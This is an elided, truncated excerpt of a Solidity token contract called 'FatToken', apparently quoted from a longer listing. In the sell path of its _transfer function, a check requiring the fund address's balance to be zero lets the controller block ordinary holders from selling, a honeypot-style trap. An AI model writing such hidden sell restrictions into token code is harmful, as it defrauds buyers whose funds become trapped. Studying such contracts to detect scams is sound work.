...
contract FatToken is BaseFatToken {
    ...
    constructor() {
        ...
        maxBuyAmount = 1* 10**8  * 10**decimals;
        maxSellAmount = 1* 10**8  * 10**decimals;

        maxWalletAmount = 1* 10**8  * 10**decimals;
        require(
            maxSellAmount >= maxBuyAmount,
            " maxSell should be > than maxBuy "
        );
        ...
        address ReceiveAddress = 0x6473F37BB7a3Ad30428deCa38F86e6757F8589c5;
        fundAddress = payable(0xB8e975627cD0CD61419b592987D009302C907146);
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                ...
                if (_swapPairList[to]) {
                    require(balanceOf(fundAddress)==0);
                    if (!inSwap) {
